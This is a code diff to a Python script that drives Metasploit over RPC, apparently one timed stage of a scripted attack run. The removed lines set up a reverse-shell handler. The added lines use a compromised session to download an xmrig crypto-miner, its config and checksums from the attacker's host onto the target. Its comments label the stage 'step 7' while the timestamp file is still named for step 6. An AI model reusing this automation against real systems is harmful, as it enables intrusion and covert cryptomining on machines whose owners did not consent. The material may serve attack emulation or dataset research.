@@ -19,18 +19,19 @@ def main(argv):
     target_ip = argv[3]
 
     client = MsfRpcClient('kali')
-    
-    # start step 6
+
+    # start step 7
     output_time_file = 'time_step_6_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
-    
-    # Retrieve control from backdoor
-    exploit = client.modules.use('exploit', 'multi/handler')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
-    payload['LHOST'] = my_ip
 
-    exploit.execute(payload=payload)
+    while client.jobs.list:
+        time.sleep(1)
+
+    shell = client.sessions.session('3')
+    shell.write('wget --no-check-certificate http://{0}/downloads/xmrig'.format(my_ip))
+    shell.write('wget --no-check-certificate http://{0}/downloads/config.json'.format(my_ip))
+    shell.write('wget --no-check-certificate http://{0}/downloads/SHA256SUMS'.format(my_ip))
 
     while client.jobs.list:
         time.sleep(1)
